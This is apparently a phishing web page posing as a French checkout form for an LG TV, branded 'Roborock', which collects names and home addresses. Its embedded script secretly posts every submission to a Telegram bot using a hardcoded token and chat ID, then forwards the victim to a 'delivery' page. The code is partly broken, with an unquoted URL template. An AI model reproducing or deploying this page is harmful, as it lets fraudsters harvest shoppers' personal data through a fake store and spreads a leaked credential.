<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commande - LG TV</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        /* Ù†ÙØ³ Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯Ø© Ø¯ÙˆÙ† ØªØºÙŠÙŠØ± */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
            color: #333;
        }
        /* Ø¨Ù‚ÙŠØ© Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª ÙƒÙ…Ø§ Ù‡ÙŠ */
    </style>
</head>
<body>
    <!-- Ø¨Ø§Ù‚ÙŠ Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØµÙØ­Ø© ÙƒÙ…Ø§ Ù‡Ùˆ -->
    <div class="navbar">
        <div class="logo">Roborock</div>
        <ul>
            <li><a href="#">Accueil</a></li>
            <li><a href="#">Produits</a></li>
            <li><a href="#">Contact</a></li>
        </ul>
    </div>

    <!-- ÙÙˆØ±Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª -->
    <div class="container">
        <h2>Remplissez vos informations</h2>
        <form id="order-form" action="page-livraison1.html" method="GET">
            <div class="form-group">
                <label for="prenom">PrÃ©nom *</label>
                <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prÃ©nom">
            </div>
            <div class="form-group">
                <label for="nom">Nom *</label>
                <input type="text" id="nom" name="nom" required placeholder="Entrez votre nom">
            </div>
            <div class="form-group">
                <label for="rue">Rue *</label>
                <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
            </div>
            <div class="form-group">
                <label for="numero">NÂ°</label>
                <input type="tel" id="numero" name="numero" placeholder="Entrez votre numÃ©ro de rue">
            </div>
            <div class="form-group">
                <label for="code_postal">Code postal *</label>
                <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
            </div>
            <div class="form-group">
                <label for="ville">Ville *</label>
                <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
            </div>
            <div class="form-group">
                <input type="submit" value="Confirmer La Commande">
            </div>
        </form>
    </div>

    <!-- Ø³ÙƒØ±ÙŠØ¨Øª Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù… -->
    <script>
        // ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª ÙˆChat ID
        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
        const chatId = "5372119436";

        // ÙˆØ¸ÙŠÙØ© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
        function sendToTelegram(data) {
            const url = https://api.telegram.org/bot${token}/sendMessage;
            const message = `
            ğŸŒŸ Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯ ğŸŒŸ
            ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${data.nom} ${data.prenom}
            ğŸ  Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${data.rue} - Ø±Ù‚Ù…: ${data.numero}, ${data.ville} (${data.code_postal})
            `;
            return fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
        }

        // Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ÙÙˆØ±Ù… ÙˆÙ…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        document.getElementById("order-form").addEventListener("submit", function (e) {
            e.preventDefault(); // Ù…Ù†Ø¹ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ

            const data = {
                prenom: document.getElementById("prenom").value,
                nom: document.getElementById("nom").value,
                rue: document.getElementById("rue").value,
                numero: document.getElementById("numero").value || "ØºÙŠØ± Ù…Ø°ÙƒÙˆØ±",
                code_postal: document.getElementById("code_postal").value,
                ville: document.getElementById("ville").value,
            };

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
            sendToTelegram(data)
                .then(response => {
                    if (response.ok) {
                        // Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ Ø§Ù„ØµÙØ­Ø©
                        alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­! ÙŠØªÙ… Ø§Ù„Ø¢Ù† ØªØ­ÙˆÙŠÙ„Ùƒ...");
                        this.submit();
                    } else {
                        alert("Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù….");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.");
                });
        });
    </script>
</body>
</html>
